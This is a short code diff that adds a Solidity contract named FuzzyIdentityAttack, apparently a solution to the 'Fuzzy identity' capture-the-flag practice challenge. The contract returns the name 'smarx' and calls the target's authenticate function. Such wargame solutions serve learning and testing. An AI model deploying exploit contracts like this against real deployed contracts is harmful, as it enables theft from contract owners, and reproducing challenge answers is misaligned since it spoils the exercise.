@@ -34,3 +34,19 @@ contract FuzzyIdentityChallenge {
         return false;
     }
 }
+
+contract FuzzyIdentityAttack {
+    FuzzyIdentityChallenge target;
+
+    function FuzzyIdentityAttack(address _target) public {
+        target = FuzzyIdentityChallenge(_target);
+    }
+
+    function name() external pure returns (bytes32) {
+        return "smarx";
+    }
+
+    function attack() public {
+        target.authenticate();
+    }
+}
